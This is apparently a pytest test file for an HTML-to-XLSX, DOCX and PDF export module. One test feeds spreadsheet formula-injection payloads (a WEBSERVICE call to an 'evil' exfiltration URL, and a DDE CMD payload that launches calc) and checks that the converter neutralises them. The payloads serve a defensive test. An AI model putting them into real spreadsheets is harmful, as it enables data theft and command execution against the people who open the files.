import pytest
from pydantic import ValidationError

from export.converter import ExportRequest, convert_export
from export.docx_converter import convert_docx
from export.xlsx_converter import convert_xlsx

HTML_DOC = """
<h1>Ueberschrift</h1>
<p>Ein Absatz.</p>
<table>
  <tr><th>Stadt</th><th>Einwohner</th></tr>
  <tr><td>Muenchen</td><td>1.500.000</td></tr>
  <tr><td>Nuernberg</td><td>500.000</td></tr>
</table>
<table>
  <tr><td>a</td></tr>
</table>
"""


@pytest.mark.unit
def test_xlsx_extracts_tables_and_prose() -> None:
    data = convert_xlsx(HTML_DOC)
    assert isinstance(data, bytes)
    assert len(data) > 0


@pytest.mark.unit
def test_xlsx_table_structure() -> None:
    from io import BytesIO

    from openpyxl import load_workbook

    workbook = load_workbook(BytesIO(convert_xlsx(HTML_DOC)))
    assert workbook.sheetnames == ["Text", "Tabelle 1", "Tabelle 2"]

    text_sheet = workbook["Text"]
    assert text_sheet.cell(row=1, column=1).value == "Ueberschrift"
    assert text_sheet.cell(row=2, column=1).value == "Ein Absatz."

    table = workbook["Tabelle 1"]
    assert table.max_row == 3
    assert table.max_column == 2
    assert table.cell(row=1, column=1).value == "Stadt"
    assert table.cell(row=2, column=1).value == "Muenchen"
    assert table.cell(row=3, column=2).value == "500.000"

    assert workbook["Tabelle 2"].cell(row=1, column=1).value == "a"


@pytest.mark.unit
def test_xlsx_without_prose_drops_text_sheet() -> None:
    from io import BytesIO

    from openpyxl import load_workbook

    workbook = load_workbook(
        BytesIO(convert_xlsx("<table><tr><td>x</td></tr></table>"))
    )
    assert workbook.sheetnames == ["Tabelle 1"]


@pytest.mark.unit
def test_xlsx_empty_document_returns_workbook() -> None:
    from io import BytesIO

    from openpyxl import load_workbook

    workbook = load_workbook(BytesIO(convert_xlsx("<p>nur text</p>")))
    assert workbook.sheetnames == ["Text"]
    assert workbook["Text"].cell(row=1, column=1).value == "nur text"


@pytest.mark.unit
def test_xlsx_neutralizes_formula_injection() -> None:
    from io import BytesIO

    from openpyxl import load_workbook

    html = (
        '<p>=WEBSERVICE("http://evil/exfil")</p>'
        "<table><tr>"
        '<td>=HYPERLINK("http://evil","x")</td>'
        "<td>=CMD|' /C calc'!A0</td>"
        "<td>+1+1</td>"
        "<td>-2+3</td>"
        "<td>@sum(A1:A2)</td>"
        "<td>normal</td>"
        "</tr></table>"
    )
    workbook = load_workbook(BytesIO(convert_xlsx(html)))
    assert (
        workbook["Tabelle 1"].cell(row=1, column=1).value
        == '\'=HYPERLINK("http://evil","x")'
    )
    for sheet in (workbook["Text"], workbook["Tabelle 1"]):
        for row in sheet.iter_rows():
            for cell in row:
                if cell.value:
                    assert cell.data_type == "s"
                    assert not str(cell.value).startswith(("=", "+", "-", "@"))


@pytest.mark.unit
def test_export_request_rejects_oversized_fields() -> None:
    for field in ("markdown", "html", "doc_json"):
        request = {
            "markdown": "m",
            "html": "h",
            "doc_json": "{}",
            "target": "pdf",
            field: "x" * 2_000_001,
        }
        with pytest.raises(ValidationError):
            ExportRequest(**request)


@pytest.mark.unit
def test_dispatch_returns_mimetype_and_filename(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import export.pdf_converter as pdf_converter

    monkeypatch.setattr(pdf_converter, "convert_pdf", lambda html: b"pdf")
    monkeypatch.setattr("export.converter.convert_docx", lambda md: b"docx")
    monkeypatch.setattr("export.converter.convert_xlsx", lambda html: b"xlsx")

    request = ExportRequest(markdown="m", html="h", doc_json="{}", target="pdf")
    data, mimetype, filename = convert_export(request)
    assert data == b"pdf"
    assert mimetype == "application/pdf"
    assert filename == "canvas.pdf"

    request.target = "docx"
    data, mimetype, filename = convert_export(request)
    assert data == b"docx"
    assert (
        mimetype
        == "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    )
    assert filename == "canvas.docx"

    request.target = "xlsx"
    data, mimetype, filename = convert_export(request)
    assert data == b"xlsx"
    assert (
        mimetype == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    )
    assert filename == "canvas.xlsx"


DOCX_HTML = """
<h1>Titel</h1>
<p>Text mit <strong>fett</strong>, <em>kursiv</em>, <s>strike</s> und <code>mono</code>.</p>
<ul><li>eins<ul><li>verschachtelt</li></ul></li><li>zwei</li></ul>
<blockquote><p>Zitat</p></blockquote>
<pre><code>Zeile 1
Zeile 2</code></pre>
<hr>
<p><a href="https://example.com">Link</a></p>
<table>
  <tr><th>Stadt</th><th>Einwohner</th></tr>
  <tr><td>Muenchen</td><td>1.500.000</td></tr>
</table>
"""


def _load_docx(data: bytes):
    from io import BytesIO

    from docx import Document

    return Document(BytesIO(data))


def _run_by_text(document, text: str):
    for paragraph in document.paragraphs:
        for run in paragraph.runs:
            if run.text == text:
                return run
    raise AssertionError(f"no run with text {text!r}")


@pytest.mark.unit
def test_docx_returns_zip() -> None:
    assert convert_docx(DOCX_HTML)[:2] == b"PK"


@pytest.mark.unit
def test_docx_blocks_and_inline_formatting() -> None:
    document = _load_docx(convert_docx(DOCX_HTML))
    styles = [p.style.name for p in document.paragraphs]
    assert styles[:9] == [
        "Heading 1",
        "Normal",
        "List Bullet",
        "List Bullet 2",
        "List Bullet",
        "Quote",
        "Normal",
        "Normal",
        "Normal",
    ]
    assert _run_by_text(document, "fett").bold is True
    assert _run_by_text(document, "kursiv").italic is True
    assert _run_by_text(document, "strike").font.strike is True
    assert _run_by_text(document, "mono").font.name == "Courier New"


@pytest.mark.unit
def test_docx_hyperlink_and_tables() -> None:
    document = _load_docx(convert_docx(DOCX_HTML))
    external = [
        rel.target_ref for rel in document.part.rels.values() if rel.is_external
    ]
    assert "https://example.com" in external

    (table,) = document.tables
    assert table.style.name == "Table Grid"
    assert len(table.rows) == 2
    assert table.rows[0].cells[0].paragraphs[0].runs[0].bold is True
    assert table.rows[0].cells[0].text == "Stadt"
    assert table.rows[1].cells[1].text == "1.500.000"


@pytest.mark.unit
def test_docx_code_block_preserves_line_breaks() -> None:
    document = _load_docx(convert_docx("<pre><code>Zeile 1\nZeile 2</code></pre>"))
    (paragraph,) = document.paragraphs
    assert [run.text for run in paragraph.runs] == ["Zeile 1\n", "Zeile 2"]
    assert paragraph.runs[0].font.name == "Courier New"


@pytest.mark.unit
def test_docx_table_colspan_merges_cells() -> None:
    html = (
        '<table><tr><th colspan="2">Kopf</th></tr><tr><td>a</td><td>b</td></tr></table>'
    )
    document = _load_docx(convert_docx(html))
    (table,) = document.tables
    assert table.rows[0].cells[0].text == "Kopf"
    assert table.rows[0].cells[0]._tc is table.rows[0].cells[1]._tc


@pytest.mark.unit
def test_docx_huge_colspan_is_clamped() -> None:
    document = _load_docx(
        convert_docx('<table><tr><td colspan="1000">x</td></tr></table>')
    )
    (table,) = document.tables
    assert len(table.columns) <= 32
    assert table.rows[0].cells[0].text == "x"


@pytest.mark.unit
def test_docx_total_merge_budget_is_bounded() -> None:
    import time

    row = "<tr>" + '<td colspan="64">x</td>' * 4 + "</tr>"
    html = "<table>" + row * 100 + "</table>"

    start = time.monotonic()
    document = _load_docx(convert_docx(html))
    assert time.monotonic() - start < 10

    (table,) = document.tables
    # early rows spend the merge budget; once it is exhausted every
    # further cell is rendered unmerged with span 1
    assert table.rows[0].cells[0]._tc is table.rows[0].cells[1]._tc
    assert table.rows[-1].cells[0]._tc is not table.rows[-1].cells[1]._tc


@pytest.mark.unit
def test_docx_invalid_colspan_converts_without_exception() -> None:
    for colspan in ("abc", "0", "-5", ""):
        html = f'<table><tr><td colspan="{colspan}">x</td></tr></table>'
        document = _load_docx(convert_docx(html))
        assert document.tables[0].rows[0].cells[0].text == "x"


def _weasyprint_available() -> bool:
    try:
        import weasyprint  # noqa: F401
    except Exception:
        return False
    return True


@pytest.mark.unit
@pytest.mark.skipif(
    not _weasyprint_available(), reason="weasyprint system libs not available"
)
def test_pdf_url_fetcher_allows_only_data_uris() -> None:
    from export.pdf_converter import _url_fetcher

    _url_fetcher.fetch("data:text/plain,hello")
    for url in (
        "http://127.0.0.1:1/x.png",
        "https://example.com/x.css",
        "file:///tmp/leak.css",
    ):
        with pytest.raises(ValueError):
            _url_fetcher.fetch(url)


@pytest.mark.integration
@pytest.mark.skipif(
    not _weasyprint_available(), reason="weasyprint system libs not available"
)
def test_pdf_conversion_ignores_external_resources(tmp_path) -> None:
    from weasyprint import HTML

    from export.pdf_converter import _url_fetcher, convert_pdf

    leak_css = tmp_path / "leak.css"
    leak_css.write_text("@page { size: 100mm 200mm }")
    html = (
        f'<link rel="stylesheet" href="file://{leak_css}">'
        '<p>text</p><img src="http://127.0.0.1:1/x.png">'
    )

    data = convert_pdf(html)
    assert data[:5] == b"%PDF-"

    page = HTML(string=html, url_fetcher=_url_fetcher).render().pages[0]
    assert page.height > 1000


@pytest.mark.integration
@pytest.mark.skipif(
    not _weasyprint_available(), reason="weasyprint system libs not available"
)
def test_pdf_conversion_with_weasyprint() -> None:
    from export.pdf_converter import convert_pdf

    data = convert_pdf("<h1>Titel</h1><p>Absatz.</p>")
    assert data[:5] == b"%PDF-"
